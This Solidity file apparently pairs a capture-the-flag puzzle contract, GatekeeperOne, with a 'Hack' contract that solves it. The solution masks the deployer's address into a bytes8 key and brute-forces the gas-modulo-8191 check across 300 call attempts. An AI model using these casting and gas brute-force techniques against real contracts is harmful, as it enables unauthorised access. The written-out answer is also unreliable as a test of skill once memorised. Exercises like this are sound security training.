// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Hack {
  GatekeeperOne public gatekeeperone;
  bytes8 key;  

  constructor(GatekeeperOne _gatekeeperone) {
    gatekeeperone = _gatekeeperone;
    key = bytes8(uint64(uint160(address(msg.sender)))) & 0x123456780000FFFF;
  }

  function attack() public {
    for(uint256 i = 0; i < 300; i++) {
      (bool success,) = address(gatekeeperone).call{gas: 3*8191 + 150 + i}(
        abi.encodeWithSignature("enter(bytes8)", key)
      );

      if (success) {
        break;
      }
    }
  }
}